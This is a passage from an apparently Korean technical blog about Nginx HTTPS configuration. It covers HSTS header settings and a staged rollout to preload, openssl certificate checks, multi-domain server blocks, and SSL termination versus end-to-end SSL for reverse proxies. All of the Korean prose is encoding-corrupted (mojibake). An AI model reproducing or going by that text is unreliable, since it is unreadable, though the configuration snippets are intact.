œ-ì™„í™”"><a href="#3-Mixed-Content-ë¬¸ì œ-ì™„í™”" class="headerlink" title="3. Mixed Content ë¬¸ì œ ì™„í™”"></a>3. Mixed Content ë¬¸ì œ ì™„í™”</h4><p>HTTPS í˜ì´ì§€ì—ì„œ HTTP ë¦¬ì†ŒìŠ¤ë¥¼ ë¡œë“œí•  ë•Œ ë°œìƒí•˜ëŠ” ë³´ì•ˆ ê²½ê³ ë¥¼ ì¤„ì…ë‹ˆë‹¤.</p><h3 id="HSTS-í—¤ë”-êµ¬ì„±-ìš”ì†Œ"><a href="#HSTS-í—¤ë”-êµ¬ì„±-ìš”ì†Œ" class="headerlink" title="HSTS í—¤ë” êµ¬ì„± ìš”ì†Œ"></a>HSTS í—¤ë” êµ¬ì„± ìš”ì†Œ</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</span><br></pre></td></tr></table></figure><p><strong>íŒŒë¼ë¯¸í„° ì„¤ëª…:</strong></p><ol><li><p><strong>max-age</strong> (í•„ìˆ˜)</p><ul><li>ë¸Œë¼ìš°ì €ê°€ HSTS ì •ì±…ì„ ê¸°ì–µí•  ì‹œê°„ (ì´ˆ ë‹¨ìœ„)</li><li><code>max-age=31536000</code>: 1ë…„ (365ì¼)</li><li><code>max-age=63072000</code>: 2ë…„ (ê¶Œì¥)</li><li>0ìœ¼ë¡œ ì„¤ì •í•˜ë©´ HSTS ë¹„í™œì„±í™”</li></ul></li><li><p><strong>includeSubDomains</strong> (ì„ íƒ)</p><ul><li>ëª¨ë“  ì„œë¸Œë„ë©”ì¸ì—ë„ HSTS ì ìš©</li><li>example.comë¿ë§Œ ì•„ë‹ˆë¼ api.example.com, blog.example.com ë“±ë„ í¬í•¨</li><li>âš ï¸ <strong>ì£¼ì˜</strong>: ëª¨ë“  ì„œë¸Œë„ë©”ì¸ì´ HTTPSë¥¼ ì§€ì›í•´ì•¼ í•¨</li></ul></li><li><p><strong>preload</strong> (ì„ íƒ)</p><ul><li>ë¸Œë¼ìš°ì €ì˜ HSTS Preload Listì— ë“±ë¡ ì‹ ì²­</li><li>ì‚¬ìš©ìê°€ í•œ ë²ˆë„ ë°©ë¬¸í•˜ì§€ ì•Šì•˜ì–´ë„ ë³´í˜¸</li><li>âš ï¸ <strong>ì£¼ì˜</strong>: ë˜ëŒë¦´ ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ì‹ ì¤‘í•˜ê²Œ ê²°ì •</li></ul></li></ol><h3 id="HSTSì˜-í•œê³„ì™€-ì£¼ì˜ì‚¬í•­"><a href="#HSTSì˜-í•œê³„ì™€-ì£¼ì˜ì‚¬í•­" class="headerlink" title="HSTSì˜ í•œê³„ì™€ ì£¼ì˜ì‚¬í•­"></a>HSTSì˜ í•œê³„ì™€ ì£¼ì˜ì‚¬í•­</h3><h4 id="ì²«-ë°©ë¬¸-ì·¨ì•½ì -Trust-On-First-Use-TOFU"><a href="#ì²«-ë°©ë¬¸-ì·¨ì•½ì -Trust-On-First-Use-TOFU" class="headerlink" title="ì²« ë°©ë¬¸ ì·¨ì•½ì  (Trust-On-First-Use, TOFU)"></a>ì²« ë°©ë¬¸ ì·¨ì•½ì  (Trust-On-First-Use, TOFU)</h4><p>HSTSëŠ” ì‚¬ìš©ìê°€ ì²˜ìŒ HTTPSë¡œ ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸í•œ ì´í›„ì—ë§Œ íš¨ê³¼ê°€ ìˆìŠµë‹ˆë‹¤. ì²« ë°©ë¬¸ ì‹œì—ëŠ” ì—¬ì „íˆ ê³µê²©ì— ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><strong>í•´ê²°ì±…</strong>: HSTS Preload List ë“±ë¡</p><h4 id="Preloadì˜-ì˜êµ¬ì„±"><a href="#Preloadì˜-ì˜êµ¬ì„±" class="headerlink" title="Preloadì˜ ì˜êµ¬ì„±"></a>Preloadì˜ ì˜êµ¬ì„±</h4><p>Preloadì— ë“±ë¡í•˜ë©´ ì œê±°í•˜ëŠ” ë° ëª‡ ë‹¬ì´ ê±¸ë¦´ ìˆ˜ ìˆìœ¼ë©°, ëª¨ë“  ë¸Œë¼ìš°ì €ì—ì„œ ì™„ì „íˆ ì œê±°ë˜ë ¤ë©´ ë” ì˜¤ë˜ ê±¸ë¦½ë‹ˆë‹¤.</p><p><strong>ì£¼ì˜ì‚¬í•­:</strong></p><ul><li>ëª¨ë“  ì„œë¸Œë„ë©”ì¸ì´ ì˜êµ¬íˆ HTTPSë§Œ ì§€ì›í•´ì•¼ í•¨</li><li>HTTPë¡œ ëŒì•„ê°ˆ ê³„íšì´ ì—†ì–´ì•¼ í•¨</li><li>ë ˆê±°ì‹œ ì„œë¸Œë„ë©”ì¸ì´ ì—†ëŠ”ì§€ í™•ì¸ í•„ìš”</li></ul><h3 id="ì„¤ì •-ë‹¨ê³„"><a href="#ì„¤ì •-ë‹¨ê³„" class="headerlink" title="ì„¤ì • ë‹¨ê³„"></a>ì„¤ì • ë‹¨ê³„</h3><h4 id="1ë‹¨ê³„-í…ŒìŠ¤íŠ¸-ì„¤ì •-ì§§ì€-ê¸°ê°„"><a href="#1ë‹¨ê³„-í…ŒìŠ¤íŠ¸-ì„¤ì •-ì§§ì€-ê¸°ê°„" class="headerlink" title="1ë‹¨ê³„: í…ŒìŠ¤íŠ¸ ì„¤ì • (ì§§ì€ ê¸°ê°„)"></a>1ë‹¨ê³„: í…ŒìŠ¤íŠ¸ ì„¤ì • (ì§§ì€ ê¸°ê°„)</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=300&quot;</span> always;</span><br></pre></td></tr></table></figure><h4 id="2ë‹¨ê³„-1ì£¼ì¼-í…ŒìŠ¤íŠ¸"><a href="#2ë‹¨ê³„-1ì£¼ì¼-í…ŒìŠ¤íŠ¸" class="headerlink" title="2ë‹¨ê³„: 1ì£¼ì¼ í…ŒìŠ¤íŠ¸"></a>2ë‹¨ê³„: 1ì£¼ì¼ í…ŒìŠ¤íŠ¸</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=604800&quot;</span> always;</span><br></pre></td></tr></table></figure><h4 id="3ë‹¨ê³„-1ë…„-ì„œë¸Œë„ë©”ì¸-í¬í•¨"><a href="#3ë‹¨ê³„-1ë…„-ì„œë¸Œë„ë©”ì¸-í¬í•¨" class="headerlink" title="3ë‹¨ê³„: 1ë…„ + ì„œë¸Œë„ë©”ì¸ í¬í•¨"></a>3ë‹¨ê³„: 1ë…„ + ì„œë¸Œë„ë©”ì¸ í¬í•¨</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;</span><br></pre></td></tr></table></figure><h4 id="4ë‹¨ê³„-Preload-ë¦¬ìŠ¤íŠ¸-ë“±ë¡"><a href="#4ë‹¨ê³„-Preload-ë¦¬ìŠ¤íŠ¸-ë“±ë¡" class="headerlink" title="4ë‹¨ê³„: Preload ë¦¬ìŠ¤íŠ¸ ë“±ë¡"></a>4ë‹¨ê³„: Preload ë¦¬ìŠ¤íŠ¸ ë“±ë¡</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=63072000; includeSubDomains; preload&quot;</span> always;</span><br></pre></td></tr></table></figure><p><a href="https://hstspreload.org/">hstspreload.org</a>ì—ì„œ ë„ë©”ì¸ ë“±ë¡</p><p>âš ï¸ <strong>ì£¼ì˜</strong>: preloadëŠ” ë˜ëŒë¦´ ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ì‹ ì¤‘í•˜ê²Œ!</p><h2 id="SSL-ì¸ì¦ì„œ-í™•ì¸"><a href="#SSL-ì¸ì¦ì„œ-í™•ì¸" class="headerlink" title="SSL ì¸ì¦ì„œ í™•ì¸"></a>SSL ì¸ì¦ì„œ í™•ì¸</h2><h3 id="ì¸ì¦ì„œ-ì •ë³´-í™•ì¸"><a href="#ì¸ì¦ì„œ-ì •ë³´-í™•ì¸" class="headerlink" title="ì¸ì¦ì„œ ì •ë³´ í™•ì¸"></a>ì¸ì¦ì„œ ì •ë³´ í™•ì¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì¸ì¦ì„œ ë‚´ìš© í™•ì¸</span></span><br><span class="line">sudo openssl x509 -<span class="keyword">in</span> /etc/letsencrypt/live/example.com/cert.pem -text -noout</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë§Œë£Œ ë‚ ì§œ í™•ì¸</span></span><br><span class="line">sudo openssl x509 -<span class="keyword">in</span> /etc/letsencrypt/live/example.com/cert.pem -noout -dates</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë„ë©”ì¸ í™•ì¸</span></span><br><span class="line">sudo openssl x509 -<span class="keyword">in</span> /etc/letsencrypt/live/example.com/cert.pem -noout -subject</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë°œê¸‰ì í™•ì¸</span></span><br><span class="line">sudo openssl x509 -<span class="keyword">in</span> /etc/letsencrypt/live/example.com/cert.pem -noout -issuer</span><br></pre></td></tr></table></figure><h3 id="ì„œë²„-SSL-í…ŒìŠ¤íŠ¸"><a href="#ì„œë²„-SSL-í…ŒìŠ¤íŠ¸" class="headerlink" title="ì„œë²„ SSL í…ŒìŠ¤íŠ¸"></a>ì„œë²„ SSL í…ŒìŠ¤íŠ¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># OpenSSLë¡œ ì—°ê²° í…ŒìŠ¤íŠ¸</span></span><br><span class="line">openssl s_client -connect example.com:443 -servername example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># ì¸ì¦ì„œ ì²´ì¸ í™•ì¸</span></span><br><span class="line">openssl s_client -connect example.com:443 -showcerts</span><br></pre></td></tr></table></figure><h3 id="ì˜¨ë¼ì¸-SSL-í…ŒìŠ¤íŠ¸-ë„êµ¬"><a href="#ì˜¨ë¼ì¸-SSL-í…ŒìŠ¤íŠ¸-ë„êµ¬" class="headerlink" title="ì˜¨ë¼ì¸ SSL í…ŒìŠ¤íŠ¸ ë„êµ¬"></a>ì˜¨ë¼ì¸ SSL í…ŒìŠ¤íŠ¸ ë„êµ¬</h3><ol><li><p><strong>SSL Labs Server Test</strong> (ê°€ì¥ ê¶Œì¥)</p><ul><li><a href="https://www.ssllabs.com/ssltest/">https://www.ssllabs.com/ssltest/</a></li><li>A+ ë“±ê¸‰ì„ ëª©í‘œë¡œ!</li></ul></li><li><p><strong>SSL Checker</strong></p><ul><li><a href="https://www.sslshopper.com/ssl-checker.html">https://www.sslshopper.com/ssl-checker.html</a></li></ul></li><li><p><strong>Why No Padlock</strong></p><ul><li><a href="https://www.whynopadlock.com/">https://www.whynopadlock.com/</a></li></ul></li></ol><h2 id="ë©€í‹°-ë„ë©”ì¸-SSL-ì„¤ì •"><a href="#ë©€í‹°-ë„ë©”ì¸-SSL-ì„¤ì •" class="headerlink" title="ë©€í‹° ë„ë©”ì¸ SSL ì„¤ì •"></a>ë©€í‹° ë„ë©”ì¸ SSL ì„¤ì •</h2><h3 id="ë°©ë²•-1-ê°-ë„ë©”ì¸ë³„-ì¸ì¦ì„œ"><a href="#ë°©ë²•-1-ê°-ë„ë©”ì¸ë³„-ì¸ì¦ì„œ" class="headerlink" title="ë°©ë²• 1: ê° ë„ë©”ì¸ë³„ ì¸ì¦ì„œ"></a>ë°©ë²• 1: ê° ë„ë©”ì¸ë³„ ì¸ì¦ì„œ</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># example.com</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> example.com www.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line">    <span class="attribute">ssl_trusted_certificate</span> /etc/letsencrypt/live/example.com/chain.pem;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/conf.d/ssl.conf;</span><br><span class="line">    <span class="attribute">root</span> /var/www/example.com;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># another-site.com</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> another-site.com www.another-site.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/another-site.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/another-site.com/privkey.pem;</span><br><span class="line">    <span class="attribute">ssl_trusted_certificate</span> /etc/letsencrypt/live/another-site.com/chain.pem;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/conf.d/ssl.conf;</span><br><span class="line">    <span class="attribute">root</span> /var/www/another-site.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ë°©ë²•-2-ì™€ì¼ë“œì¹´ë“œ-ì¸ì¦ì„œ"><a href="#ë°©ë²•-2-ì™€ì¼ë“œì¹´ë“œ-ì¸ì¦ì„œ" class="headerlink" title="ë°©ë²• 2: ì™€ì¼ë“œì¹´ë“œ ì¸ì¦ì„œ"></a>ë°©ë²• 2: ì™€ì¼ë“œì¹´ë“œ ì¸ì¦ì„œ</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> app1.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ê°™ì€ ì™€ì¼ë“œì¹´ë“œ ì¸ì¦ì„œ ì‚¬ìš©</span></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/conf.d/ssl.conf;</span><br><span class="line">    <span class="attribute">root</span> /var/www/app1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> app2.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ê°™ì€ ì™€ì¼ë“œì¹´ë“œ ì¸ì¦ì„œ ì‚¬ìš©</span></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/conf.d/ssl.conf;</span><br><span class="line">    <span class="attribute">root</span> /var/www/app2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ë¦¬ë²„ìŠ¤-í”„ë¡ì‹œì—ì„œ-SSL"><a href="#ë¦¬ë²„ìŠ¤-í”„ë¡ì‹œì—ì„œ-SSL" class="headerlink" title="ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œì—ì„œ SSL"></a>ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œì—ì„œ SSL</h2><p>ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œ í™˜ê²½ì—ì„œ SSL&#x2F;TLSë¥¼ êµ¬ì„±í•˜ëŠ” ë°©ë²•ì€ í¬ê²Œ ë‘ ê°€ì§€ì…ë‹ˆë‹¤. ê° ë°©ë²•ì€ ì„œë¡œ ë‹¤ë¥¸ ë³´ì•ˆ ìˆ˜ì¤€ê³¼ ì„±ëŠ¥ íŠ¹ì„±ì„ ê°€ì§€ë¯€ë¡œ, ìš”êµ¬ì‚¬í•­ì— ë§ê²Œ ì„ íƒí•´ì•¼ í•©ë‹ˆë‹¤.</p><h3 id="1-SSL-Termination-SSL-ì¢…ë£Œ-ê¶Œì¥-ë°©ì‹"><a href="#1-SSL-Termination-SSL-ì¢…ë£Œ-ê¶Œì¥-ë°©ì‹" class="headerlink" title="1. SSL Termination (SSL ì¢…ë£Œ) - ê¶Œì¥ ë°©ì‹"></a>1. SSL Termination (SSL ì¢…ë£Œ) - ê¶Œì¥ ë°©ì‹</h3><p><strong>ê°œë…:</strong><br>SSL Terminationì€ Nginxì—ì„œ SSL&#x2F;TLS ì—°ê²°ì„ ì¢…ë£Œí•˜ê³ , ë°±ì—”ë“œ ì„œë²„ì™€ëŠ” ì•”í˜¸í™”ë˜ì§€ ì•Šì€ HTTPë¡œ í†µì‹ í•˜ëŠ” ë°©ì‹ì…ë‹ˆë‹¤. ì´ëŠ” ê°€ì¥ ì¼ë°˜ì ì´ê³  íš¨ìœ¨ì ì¸ êµ¬ì„±ì…ë‹ˆë‹¤.</p><p><strong>í†µì‹  íë¦„:</strong></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">í´ë¼ì´ì–¸íŠ¸ â†” Nginx (HTTPS) â†’ ë°±ì—”ë“œ ì„œë²„ (HTTP)</span><br></pre></td></tr></table></figure><p><strong>ì¥ì :</strong></p><ol><li><p><strong>ì„±ëŠ¥ í–¥ìƒ</strong></p><ul><li>SSL&#x2F;TLS ì•”í˜¸í™”&#x2F;ë³µí˜¸í™”ë¥¼ Nginxì—ì„œë§Œ ì²˜ë¦¬í•˜ë¯€ë¡œ ë°±ì—”ë“œ ì„œë²„ì˜ CPU ë¶€ë‹´ ê°ì†Œ</li><li>ë°±ì—”ë“œ ì„œë²„ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ë¡œì§ì—ë§Œ ì§‘ì¤‘ ê°€ëŠ¥</li><li>ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ëŠ” ì•”í˜¸í™” ì˜¤ë²„í—¤ë“œ ì—†ì´ ë¹ ë¥¸ í†µì‹ </li></ul></li><li><p><strong>ì¤‘ì•™í™”ëœ ì¸ì¦ì„œ ê´€ë¦¬</strong></p><ul><li>ì¸ì¦ì„œë¥¼ Nginx í•œ ê³³ì—ì„œë§Œ ê´€ë¦¬</li><li>ì¸ì¦ì„œ ê°±ì‹ ì´ ê°„ë‹¨í•¨</li><li>ì—¬ëŸ¬ ë°±ì—”ë“œ ì„œë²„ê°€ ìˆì–´ë„ ì¸ì¦ì„œëŠ” í•˜ë‚˜ë§Œ í•„ìš”</li></ul></li><li><p><strong>ê°„í¸í•œ ë°±ì—”ë“œ ì„¤ì •</strong></p><ul><li>ë°±ì—”ë“œ ì„œë²„ì— SSL ì„¤ì •ì´ ë¶ˆí•„ìš”</li><li>ë°±ì—”ë“œ ì• í”Œë¦¬ì¼€ì´ì…˜ ì½”ë“œ ìˆ˜ì • ë¶ˆí•„ìš”</li><li>ë‹¤ì–‘í•œ ë°±ì—”ë“œ ê¸°ìˆ  ìŠ¤íƒ ì§€ì› ìš©ì´</li></ul></li><li><p><strong>ë¡œë“œ ë°¸ëŸ°ì‹±ê³¼ í†µí•© ìš©ì´</strong></p><ul><li>SSL Offloadingê³¼ ë¡œë“œ ë°¸ëŸ°ì‹±ì„ ë™ì‹œì— ì²˜ë¦¬</li><li>í—¬ìŠ¤ ì²´í¬ê°€ ê°„ë‹¨í•¨</li></ul></li></ol><p><strong>ë‹¨ì :</strong></p><ol><li><p><strong>ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ</strong></p><ul><li>Nginxì™€ ë°±ì—”ë“œ ì‚¬ì´ì˜ íŠ¸ë˜í”½ì´ í‰ë¬¸ìœ¼ë¡œ ì „ì†¡ë¨</li><li>ê°™ì€ ë„¤íŠ¸ì›Œí¬ ë‚´ì˜ ê³µê²©ìê°€ íŠ¸ë˜í”½ì„ ê°€ë¡œì±Œ ìˆ˜ ìˆìŒ</li><li><strong>í•´ê²°ì±…</strong>: ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ë¥¼ ê²©ë¦¬í•˜ê±°ë‚˜ VPN ì‚¬ìš©</li></ul></li><li><p><strong>ê·œì œ ì¤€ìˆ˜ ë¬¸ì œ</strong></p><ul><li>PCI DSS, HIPAA ë“± íŠ¹ì • ê·œì •ì—ì„œëŠ” end-to-end ì•”í˜¸í™”ë¥¼ ìš”êµ¬í•  ìˆ˜ ìˆìŒ</li><li><strong>í•´ê²°ì±…</strong>: ê·œì œ ìš”êµ¬ì‚¬í•­ í™•ì¸ í›„ í•„ìš”ì‹œ End-to-End SSL ì‚¬ìš©</li></ul></li></ol><p><strong>ì í•©í•œ ì‚¬ìš© ì‚¬ë¡€:</strong></p><ul><li>ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ í™˜ê²½</li><li>í´ë¼ìš°ë“œ VPC ë‚´ë¶€ í†µì‹ </li><li>ë™ì¼ ë°ì´í„°ì„¼í„° ë‚´ì˜ ì„œë²„ ê°„ í†µì‹ </li><li>ì„±ëŠ¥ì´ ì¤‘ìš”í•œ ê³ íŠ¸ë˜í”½ ì‚¬ì´íŠ¸</li><li>ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ì•„í‚¤í…ì²˜ (ì„œë¹„ìŠ¤ ë©”ì‹œ ì—†ì´)</li></ul><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> api.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/api.example.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/api.example.com/privkey.pem;</span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/conf.d/ssl.conf;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ë°±ì—”ë“œì— ì›ë³¸ ì •ë³´ ì „ë‹¬</span></span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> X-Forwarded-Port <span class="variable">$server_port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-End-to-End-SSL-ì¢…ë‹¨-ê°„-ì•”í˜¸í™”"><a href="#2-End-to-End-SSL-ì¢…ë‹¨-ê°„-ì•”í˜¸í™”" class="headerlink" title="2. End-to-End SSL (ì¢…ë‹¨ ê°„ ì•”í˜¸í™”)"></a>2. End-to-End SSL (ì¢…ë‹¨ ê°„ ì•”í˜¸í™”)</h3><p><strong>ê°œë…:</strong><br>End-to-End SSLì€ í´ë¼ì´ì–¸íŠ¸ë¶€í„° ë°±ì—”ë“œ ì„œë²„ê¹Œì§€ ì „ êµ¬ê°„ì„ ì•”í˜¸í™”í•˜ëŠ” ë°©ì‹ì…ë‹ˆë‹¤. NginxëŠ” í´ë¼ì´ì–¸íŠ¸ì˜ SSL ì—°ê²°ì„ ì¢…ë£Œí•˜ì§€ë§Œ, ë°±ì—”ë“œ ì„œë²„ì™€ë„ ìƒˆë¡œìš´ SSL ì—°ê²°ì„ ë§ºìŠµë‹ˆë‹¤.</p><p><strong>í†µì‹  íë¦„:</strong></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">í´ë¼ì´ì–¸íŠ¸ â†” Nginx (HTTPS) â†’ ë°±ì—”ë“œ ì„œë²„ (HTTPS)</span><br></pre></td></tr></table></figure><p><strong>ì¥ì :</strong></p><ol><li><p><strong>ìµœê³  ìˆ˜ì¤€ì˜ ë³´ì•ˆ</strong></p><ul><li>ì „ êµ¬ê°„ ì•”í˜¸í™”ë¡œ ì¤‘ê°„ì ê³µê²© ë°©ì§€</li><li>ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ê°€ ì¹¨í•´ë˜ì–´ë„ íŠ¸ë˜í”½ ë‚´ìš© ë³´í˜¸</li><li>Zero Trust ë„¤íŠ¸ì›Œí¬ ëª¨ë¸ì— ì í•©</li></ul></li><li><p><strong>ê·œì œ ì¤€ìˆ˜</strong></p><ul><li>PCI DSS, HIPAA, SOC 2 ë“± ì—„ê²©í•œ ë³´ì•ˆ ê·œì • ì¶©ì¡±</li><li>ê°ì‚¬ ì¶”ì (Audit Trail)ì— ìœ ë¦¬</li><li>ì»´í”Œë¼ì´ì–¸ìŠ¤ ìš”êµ¬ì‚¬í•­ ë§Œì¡±</li></ul></li><li><p><strong>ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ë³´ì•ˆ</strong></p><ul><li>ì„œë¹„ìŠ¤ ê°„ í†µì‹ ë„ ì•”í˜¸í™”</li><li>ì„œë¹„ìŠ¤ ë©”ì‹œ(Service Mesh)ì™€ í†µí•© ê°€ëŠ¥</li><li>mTLS(mutual TLS)ë¡œ í™•ì¥ ê°€ëŠ¥</li></ul></li></ol><p><strong>ë‹¨ì :</strong></p><ol><li><p><strong>ì„±ëŠ¥ ì˜¤ë²„í—¤ë“œ</strong></p><ul><li>ì´ì¤‘ SSL í•¸ë“œì…°ì´í¬ë¡œ ì§€ì—° ì‹œê°„ ì¦ê°€</li><li>Nginxì™€ ë°±ì—”ë“œ ëª¨ë‘ ì•”í˜¸í™”&#x2F;ë³µí˜¸í™” ì²˜ë¦¬</li><li>CPU ì‚¬ìš©ëŸ‰ ì¦ê°€ (íŠ¹íˆ ë°±ì—”ë“œ ì„œë²„)</li></ul></li><li><p><strong>ë³µì¡í•œ ì¸ì¦ì„œ ê´€ë¦¬</strong></p><ul><li>Nginxì™€ ë°±ì—”ë“œ ëª¨ë‘ ì¸ì¦ì„œ í•„ìš”</li><li>ë°±ì—”ë“œ ì¸ì¦ì„œëŠ” ìì²´ ì„œëª… ë˜ëŠ” ë‚´ë¶€ CA ì‚¬ìš©</li><li>ì¸ì¦ì„œ ê°±ì‹ ì´ ë‘ ë°°ë¡œ í•„ìš”</li></ul></li><li><p><strong>ë””ë²„ê¹… ì–´ë ¤ì›€</strong></p><ul><li>ì•”í˜¸í™”ëœ íŠ¸ë˜í”½ ë¶„ì„ì´ ì–´ë ¤ì›€</li><li>ë¬¸ì œ ì¶”ì  ì‹œ ë³µì¡ë„ ì¦ê°€</li><li>ë¡œê¹… ë° ëª¨ë‹ˆí„°ë§ì´ ì œí•œì </li></ul></li><li><p><strong>ì„¤ì • ë³µì¡ì„±</strong></p><ul><li>ë°±ì—”ë“œ ì• í”Œë¦¬ì¼€ì´ì…˜ì— SSL ì„¤ì • í•„ìš”</li><li>ì¸ì¦ì„œ ê²€ì¦ ì„¤ì • í•„ìš”</li><li>ì˜ëª» ì„¤ì • ì‹œ ì—°ê²° ì‹¤íŒ¨ ìœ„í—˜</li></ul></li></ol><p><strong>ì í•©í•œ ì‚¬ìš© ì‚¬ë¡€:</strong></p><ul><li>ê¸ˆìœµ, ì˜ë£Œ, ì •ë¶€ ì‹œìŠ¤í…œ</li><li>ê·œì œ ì¤€ìˆ˜ê°€ í•„ìˆ˜ì¸ í™˜ê²½</li><li>ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ë„¤íŠ¸ì›Œí¬ í™˜ê²½ (ì˜ˆ: ë©€í‹° í´ë¼ìš°ë“œ)</li><li>ê³ ë„ì˜ ë³´ì•ˆì´ í•„ìš”í•œ API</li><li>Zero Trust ì•„í‚¤í…ì²˜</li><li>ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ ê²©ë¦¬ê°€ ë¶ˆê°€ëŠ¥í•œ í™˜ê²½</li></ul><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> api.example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/letsencrypt/live/api.example.com/fullchain.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/api.example.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> https://backend-server:8443;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ë°±ì—”ë“œ SSL ê²€ì¦</span></span><br><span class="line">        <span class="attribute">proxy_ssl_verify</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">proxy_ssl_trusted_certificate</span> 